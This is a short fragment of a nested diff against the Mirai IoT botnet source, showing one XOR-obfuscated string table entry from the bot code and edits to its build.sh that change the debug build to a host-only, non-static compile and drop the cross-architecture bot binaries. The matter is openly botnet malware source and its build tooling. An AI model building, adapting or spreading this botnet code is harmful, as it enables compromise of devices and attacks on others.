@@ -174,7 +174,7 @@ index 13b341e..18ffc79 100755
  
      add_entry(TABLE_EXEC_SUCCESS, "\x4E\x4B\x51\x56\x47\x4C\x4B\x4C\x45\x02\x56\x57\x4C\x12\x22", 15);
 diff --git a/mirai/build.sh b/mirai/build.sh
-index 51afd44..25720de 100755
+index 51afd44..5969152 100755
 --- a/mirai/build.sh
 +++ b/mirai/build.sh
 @@ -1,4 +1,5 @@
@@ -183,14 +183,16 @@ index 51afd44..25720de 100755
  
  FLAGS=""
  
-@@ -49,10 +50,6 @@ elif [ "$1" == "release" ]; then
+@@ -48,11 +49,7 @@ elif [ "$1" == "release" ]; then
+ 
      go build -o release/scanListen tools/scanListen.go
  elif [ "$1" == "debug" ]; then
-     gcc -std=c99 bot/*.c -DDEBUG "$FLAGS" -static -g -o debug/mirai.dbg
+-    gcc -std=c99 bot/*.c -DDEBUG "$FLAGS" -static -g -o debug/mirai.dbg
 -    mips-gcc -std=c99 -DDEBUG bot/*.c "$FLAGS" -static -g -o debug/mirai.mips
 -    armv4l-gcc -std=c99 -DDEBUG bot/*.c "$FLAGS" -static -g -o debug/mirai.arm
 -    armv6l-gcc -std=c99 -DDEBUG bot/*.c "$FLAGS" -static -g -o debug/mirai.arm7
 -    sh4-gcc -std=c99 -DDEBUG bot/*.c "$FLAGS" -static -g -o debug/mirai.sh4
++    gcc -std=c99 bot/*.c -DDEBUG "$FLAGS" -g -o debug/mirai.dbg
      gcc -std=c99 tools/enc.c -g -o debug/enc
      gcc -std=c99 tools/nogdb.c -g -o debug/nogdb
      gcc -std=c99 tools/badbot.c -g -o debug/badbot
